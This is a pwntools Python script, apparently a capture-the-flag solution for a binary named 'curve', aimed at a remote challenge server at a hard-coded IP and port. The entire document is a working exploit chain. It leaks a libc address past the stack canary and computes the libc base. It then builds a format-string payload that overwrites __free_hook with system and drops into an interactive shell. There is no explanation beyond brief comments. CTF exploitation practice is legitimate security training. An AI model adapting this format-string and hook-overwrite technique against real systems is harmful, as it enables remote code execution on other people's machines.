from pwn import *

elf = ELF("./curve")
libc = ELF("./libc-2.31.so")
context.binary = elf
# r = process(elf.path)
r = remote("143.198.127.103", 42004)
# INPUT 1
payload = b"A"*(136 + 8 + 8)
r.sendafter(b"Input 1:\n", payload)
r.recv(136) # PADDING
r.recv(8)   # PADDING OVER CANARY
r.recv(8)   # PADDING OVER RBP
leak = u64(r.recv(6) + b"\x00"*2)
libc.address = leak - 234 - libc.symbols["__libc_start_main"]
# INPUT 2
address = libc.symbols["__free_hook"]
payload = b"".join([p64(address+(i*2)) for i in range(4)])
r.sendlineafter(b"Input 2:\n", payload)
# INPUT 3
content = p64(libc.symbols["system"])
content = [content[i:i+2] for i in range(0, 8, 2)]
offset = 8
s = b"sh\x00\x00"
s = int.from_bytes(s, "little")
payload = f"%{s}c%1$n"
numwritten = s
for i in range(len(content)):
    l = int.from_bytes(content[i], "little")
    x = (l - numwritten) % 0x10000
    payload += f"%{x}c%{offset+i}$hn"
    numwritten = l
assert len(payload) <= 0x80, "PAYLOAD TOO LONG"
print(payload)
r.sendlineafter(b"Input 3:\n", payload)
r.interactive()
